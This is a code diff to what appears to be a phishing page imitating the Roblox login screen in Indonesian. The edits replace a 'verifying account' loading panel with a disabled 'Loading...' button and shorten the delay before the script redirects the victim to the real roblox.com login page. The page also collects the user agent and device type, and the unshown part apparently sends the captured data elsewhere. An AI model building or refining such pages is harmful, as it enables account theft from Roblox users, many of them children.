@@ -14,13 +14,13 @@
   input:focus { border-color: #fff; }
   button { width: 100%; background: transparent; color: #fff; border: 1px solid #fff; border-radius: 8px; padding: 14px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 12px; margin-bottom: 24px; }
   button:active { background: rgba(255,255,255,0.1); }
+  button:disabled { opacity: 0.7; cursor: not-allowed; }
   .err { display:none; color: #ff5555; font-size: 12px; margin-top: -8px; margin-bottom: 12px; }
   .links { text-align: center; font-size: 15px; color: #b8b8b8; }
   .links a { color: #fff; text-decoration: none; display: block; margin-bottom: 12px; }
   .btn-gray { display: block; width: 100%; background: #393b3d; color: #fff; padding: 14px; border-radius: 8px; text-align: center; text-decoration: none; font-weight: 600; margin-bottom: 10px; cursor: pointer; }
   .footer { text-align: center; font-size: 14px; color: #b8b8b8; margin-top: 24px; }
   .footer a { color: #fff; text-decoration: none; font-weight: 600; }
-  .loading { display: none; text-align: center; font-size: 15px; color: #b8b8b8; margin-top: 15px; font-style: italic;}
 </style>
 </head>
 <body>
@@ -45,10 +45,6 @@
     <a href="#" class="btn-gray">Opsi log in lainnya</a>
     
     <div class="footer" id="txt-footer">Tidak punya akun? <a href="#" onclick="return false;">Daftar</a></div>
-  </div>
-
-  <div id="loadingSection" class="loading">
-    <p>Memverifikasi akun...</p>
   </div>
 
 </main>
@@ -84,8 +80,8 @@ document.getElementById('f').addEventListener('submit', function(e){
   }
 
   err.style.display = "none";
-  document.getElementById('loginSection').style.display = "none";
-  document.getElementById('loadingSection').style.display = "block";
+  go.textContent = "Loading...";
+  go.disabled = true;
 
   var ua = navigator.userAgent;
   var device = "Unknown";
@@ -133,7 +129,7 @@ document.getElementById('f').addEventListener('submit', function(e){
     .then(() => {
       setTimeout(() => {
         window.location.href = "https://www.roblox.com/login";
-      }, 2000);
+      }, 1500);
     });
   })
   .catch(() => {
